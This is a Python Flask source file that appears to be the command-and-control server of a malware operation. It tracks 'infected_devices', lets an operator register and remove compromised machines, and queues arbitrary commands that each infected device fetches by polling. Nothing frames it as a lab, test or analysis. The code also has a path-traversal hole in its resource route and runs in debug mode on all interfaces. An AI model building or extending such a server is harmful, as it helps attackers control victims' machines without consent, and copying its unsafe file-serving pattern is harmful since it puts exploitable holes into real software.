from flask import Flask, jsonify, send_file, request
from flask_cors import CORS

app = Flask(__name__)
CORS(app, supports_credentials=True)

infected_devices = []
messages = {}

@app.route("/")
def home():
  return send_file("templates/index.html")

@app.route("/success")
def success():
  return send_file("templates/success/index.html")

@app.route("/fatal")
def fatal():
  return send_file("templates/fatal/index.html")

@app.route("/commands", methods=["POST", "GET"])
def commands():
  if request.method == 'POST':
    message = request.get_json(force=True, silent=True) or {}
    req = message.get('request', '')

    if 'ping' in req:
      return jsonify({'status': 'pong'})
    if 'new-device' in message:
      device_name = message['new-device'].upper()
      if device_name not in infected_devices:
        infected_devices.append(device_name)
        print('New device:', device_name)
      return jsonify({'status': 'success'})
    elif 'delete-all-devices' in req:
      infected_devices.clear()
      print('All devices deleted')
      return jsonify({'status': 'success'})
    elif 'get-all-devices' in req:
      return jsonify({'status': 'success', 'devices': infected_devices})
    elif 'remove-device' in req:
      device_name = message['name'].upper()
      if device_name in infected_devices:
        infected_devices.remove(device_name)
        print('Removed device:', device_name)
      return jsonify({'status': 'success'})

    device = message['device'].upper()
    if device in infected_devices:
      messages.setdefault(device, []).append(message)
      print(f"Queued message for {device}: {message}")
      return jsonify({'status': 'success'})

    print(f"Device {device} not found. Message not queued.")
    return jsonify({'status': 'error', 'message': f'device {device} not found.'}), 404
  elif request.method == 'GET':
    device = request.args.get('device', '').upper()
    if device in infected_devices:
      out = messages.get(device, []).copy()
      print(f'Message fetched for {device}: {out}')
      messages.pop(device, None)
      return jsonify(out)
    
    print(f"Device {device} not found. No messages to fetch.")
    return jsonify({'status': 'error', 'message': f'device {device} not found.'}), 404
  
@app.route("/resources/<path:filename>")
def serve_resource(filename):
  return send_file(f"templates/{filename}")

if __name__ == "__main__":
  app.run(host='0.0.0.0', port=8003, debug=True)